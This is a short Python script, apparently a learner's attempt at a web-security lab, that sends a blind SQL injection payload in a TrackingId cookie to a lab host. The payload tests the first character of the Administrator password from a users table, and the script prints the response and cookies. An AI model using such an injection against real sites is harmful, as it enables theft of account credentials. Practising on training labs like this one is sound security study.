import requests

session = requests.Session()

# session.cookies.set(TrackingId='ht3cFYzvWu81gQFt')

cookies = {'TrackingId': "liaMyEi1ayXP0vpb' and substring((select password from users where username='Administrator'), 1, 1) > 'a'--'", 'session': 'dY44ocTSt64VmYEVSDn1r6xX34BAbYcN'}

r = requests.get('https://acde1ff91f81458b807a8acf008700e1.web-security-academy.net/filter?category=Gifts', cookies=cookies)
c = r.cookies
i = c.items()

# s_session = requests.Session()

# print(s_session.cookies.get_dict())

print(r.content)

for name, val in i:
	print(name, val)